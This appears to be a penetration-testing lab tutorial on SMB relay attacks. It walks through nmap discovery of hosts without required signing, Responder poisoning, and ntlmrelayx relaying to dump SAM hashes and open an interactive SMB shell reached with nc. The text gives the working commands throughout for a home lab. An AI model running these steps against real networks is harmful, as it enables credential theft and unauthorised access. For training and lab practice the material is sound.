
First of all we need to run our nmap scan, to check for the host with **SMB** signing disabled

![](https://i.imgur.com/MlaVrME.jpg)

Now we can save  the host that have the prompt **"message signing enabled but not required"** into a **targets.txt** file

![](https://i.imgur.com/vNu7Yc1.png)

Now we can disable the **HTTP** and **SMB** protocol in the responder.conf file, located under `/etc/responder/Responder.conf`

![](https://i.imgur.com/7mRX0rr.png)

We can then startup `responder` with the syntax used previously in **LLMNR Poisoning** `sudo responder -i wlan0 -dwPv` (v for verbose)

![](https://i.imgur.com/TaJpooZ.png)

Now we can startup the `ntlmrelayx.py` tool wit these syntax `ntlmrelayx.py -tf targets.txt -smb2support` , if you don't have it, you can download it from [here](https://github.com/fortra/impacket/blob/impacket_0_9_19/examples/ntlmrelayx.py) and move it to `/usr/bin` 

> If you are still having problem with ntlmrelayx not working, you can download this [tool](https://github.com/Dewalt-arch/pimpmykali) officially made by the TCM members to fix things

![](https://i.imgur.com/Rdh5Zvu.jpg)

The next thing is for our target, to create an event (We are gonna be utilizing **THE-PUNISHER** VM) , remember the `\\ATACKER-IP`

![](https://dimitrios-tsarouchas.tech/assets/img/DNS-failure-Wrong-address.png)


**_Local SAM hashes have been dumped_**

![](https://i.imgur.com/GCHxNP1.png)



The authentication succeeded because SMB signing is enabled but not required and because “peterparker” is the Administrator on this computer. Therefore, the SAM hashes were able to be dumped. Now the attacker can copy the SAM hashes, try cracking them offline and move laterally or vertically.

***
## **Spawning Reverse Shell**


Same as we did in the previous section, we can simply get an interactive SMB shell by just adding a flag to `ntlmrelayx.py` command

```shell
$ ntlmrelayx.py -tf targets -smb2support -i
```

`-i` will give the interactive shell. After running the command, you will see an output like below

![](https://www.hackingloops.com/wp-content/uploads/2023/01/6-2-1024x407.png)

It has successfully exploited and started interactive SMB client shell via TCP on the specified port.

To access the shell, you can simply use `nc` to connect to the host and port using the following command

```
nc 127.0.0.1 11000
```

This will give you the SMB shell as below

![](https://www.hackingloops.com/wp-content/uploads/2023/01/7-2.png)

From here, you can interact using the shell and access the files and folders., for example to see the content of these shares we can say

```shell
# shares
# use C$
# use ADMIN$
# use IPC$
```

Then we can do `ls`

![](https://i.imgur.com/Q2m4kx2.png)

